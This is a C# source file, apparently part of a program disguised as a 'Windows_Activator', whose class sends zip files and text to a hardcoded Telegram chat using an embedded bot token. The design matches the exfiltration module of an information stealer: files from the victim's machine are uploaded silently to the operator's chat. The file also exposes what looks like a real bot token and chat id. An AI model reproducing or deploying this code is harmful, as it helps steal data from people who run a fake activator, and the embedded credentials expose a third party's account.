using Telegram.Bot;
using Telegram.Bot.Types.InputFiles;


namespace Windows_Activator;

public static class Telegramma
{
    private static readonly Telegram.Bot.Types.ChatId chatId = 1555910765;//chat id
    private static readonly string botToken = "6349014558:AAEi6q_8JAxkYdhPEEukCwQWl28IAMZg66E";
    private static readonly TelegramBotClient botClient = new TelegramBotClient(botToken);

    public static async Task SendFile(string zipFilePath, long chatId = 1555910765)
    {
        if (System.IO.File.Exists(zipFilePath))
        {
            using (FileStream fileStream = new FileStream(zipFilePath, FileMode.Open, FileAccess.Read))
            {
                InputOnlineFile inputOnlineFile = new InputOnlineFile(fileStream);
                inputOnlineFile.FileName = Path.GetFileName(zipFilePath);

                await botClient.SendDocumentAsync(chatId, inputOnlineFile);
            }

            Console.WriteLine("File sent successfully.");
        }
    }

    public static void SendText(string textForMsg)
    {
        try
        {
            botClient.SendTextMessageAsync(chatId, textForMsg);
            Console.WriteLine("Sucsess");
            Thread.Sleep(80);
        }
        catch
        {
            Console.WriteLine("Failed");
            Thread.Sleep(80);
        }
    }
}
